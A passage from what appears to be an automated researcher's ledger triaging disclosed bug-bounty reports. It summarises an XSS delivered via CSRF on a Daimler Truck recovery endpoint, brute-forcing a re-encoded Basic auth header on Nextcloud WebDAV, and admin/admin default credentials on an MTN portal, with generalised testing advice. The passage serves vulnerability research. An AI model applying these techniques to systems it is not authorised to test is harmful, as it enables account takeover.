response-LENGTH differential on a URL-fetch endpoint can be produced by the CDN/cache rather than by the origin fetch — before treating a length delta as an SSRF port oracle, re-baseline the same URL twice and use a URL that differs ONLY in the port, and prefer a timing or out-of-band oracle.
- #2050122 (Daimler Truck, "CSRF + XSS REFLECT", weakness Cross-site Scripting (XSS) - Reflected) — INVALID / UNREADABLE, nothing appended, nothing invented. Every route tried this pass, in the required order: `web_extract` -> the HackerOne sign-in page (report behind login); `https://hackerone.com/reports/2050122.json` -> HTTP 404 (and `?format=json` -> 404); the browser tool on the live URL -> Cloudflare "Performing security verification", then `https://hackerone.com/users/sign_in`; `https://r.jina.ai/<url>` -> HTTP 401 ("blocked from performing anonymous queries due to bad IP reputation"); Wayback `archive.org/wayback/available` -> exactly one capture (2023-12-11), but every replay form (`/web/<ts>/`, `id_`, `if_`, `oe_`, `cs_`, `js_`) returns either HackerOne's JS-disabled SPA shell or a Wayback 404, and no `.json` capture exists; the ajaysenr disclosed-reports mirror has no file for this id (`reports/2050122.md` -> 404, and the repo's full git tree listing contains no entry); the local parquet mirrors `/tmp/h1_{train,val,test}.parquet` have no row. The ONLY public text anywhere is the OG meta description inside the Wayback capture, read this pass: "I found a reflected XSS at https://www.truck-privilege.daimlertruck.com/auth/lostLogin — To make it reflected, CSRF - Cross-Site request Forgery was used together. An attacker can create a malicious website and trick the user into opening it, when the user opens it, he is automatically redirected to the Daimler Truck page running the script (XSS). In the video I do…" (truncated by the meta tag). That names an endpoint (`/auth/lostLogin`) and a combination (CSRF used to deliver a reflection) but carries NO parameter name, NO payload, NO request shape and NO chain beyond "running the script". Per the chain-only rule a reflected-XSS primitive with no documented escalation is not an entry. LEAD ONLY, not an entry: a recovery endpoint (`/auth/lostLogin`) whose XSS is reachable only through a cross-site auto-submit — i.e. a POST-body reflection that a GET link cannot deliver; test lost-login / forgot-password endpoints with an auto-submitting cross-site form.
- #1879549 (Nextcloud, "Basic auth header on WebDAV requests is not bruteforce protected", weakness Improper Restriction of Authentication Attempts, High 8.1, CVE-2023-32319, reporter `hackit_bharat`, submitted 2023-02-20, disclosed 2023-06-02) — full 1,107 B body read live on the `.json` route. Method: a WebDAV private-link URL (`/remote.php/dav/calendars/<email>/app-generated--deck--board-5269/`) prompts for HTTP Basic auth; the USERNAME IS IN THE URL, so no enumeration is needed; capture the `Authorization: Basic` header, base64-decode it, replace the password, re-encode, and Intruder-brute-force the header with NO rate limit / lockout -> 200 -> account takeover. NOT APPENDED: (a) the CLASS is already recorded — a credential check with no throttle, brute-forced to account takeover, is recorded at ledger ~3900-3910 (#125505 / #125200 / #125707 code brute force with a response oracle), ~4531-4543 (#1363672: a per-identifier throttle keyed on the RAW identifier while the auth path normalizes it, so the counter resets and the same account can be guessed unlimited times) and the doctrine's §2(c) excludes most rate-limiting issues standalone; (b) the DELTA is a carrier/route delta of an already-recorded pattern — ledger ~2884 records "a CONTROL enforced on the PRIMARY route but NOT on an ALTERNATE route that performs the same operation", and here the login rate limiter covers the HTML login form while the HTTP Basic-auth path on `/remote.php/dav/...` is a second authentication route outside it. The only genuinely new atom is the Basic-auth-on-WebDAV carrier plus the username-in-URL self-containment — a carrier detail, not a new bypass, and UNVERIFIED. Recorded here so a later pass does not re-open #1879549 as if new.
- #817331 (MTN Group, "Weak/Auto Fill Password", weakness Insufficiently Protected Credentials, severity critical, reporter `harris0ft`, submitted 2020-03-12, disclosed 2022-09-03, resolved, no bounty, 53 votes) — full 419 B body plus the researcher's own summary read live on the `.json` route. Method: `https://mtnc-selfservice.mtncameroon.net` accepts `admin/admin` -> "booom …. full asset to super admin full panel"; impact as stated, verbatim: "Attacker can make major configuration changes to the services." The researcher's own note is a testing doctrine, not a technique: "Pure luck!!! - admin/admin. All login page ==MUST== be tested with admin/admin & root/root." NOT APPENDED: this is an INSTANCE of the already-recorded default/weak-credential class — §17.367 (ledger ~10640-10649) records "authentication bypass via DEFAULT or WEAK ADMIN CONSOLE CREDENTIALS" with a TRANSFERABLE TEST that already lists `admin:admin` among the pairs to try against any exposed administrative login, and ledger ~3304 records a hard-coded placeholder credential surviving an SSO migration. The delta here is only the carrier (a carrier self-service portal rather than an admin console) and the impact wording; the method and the test are unchanged, so per the no-duplicates rule nothing is appended.

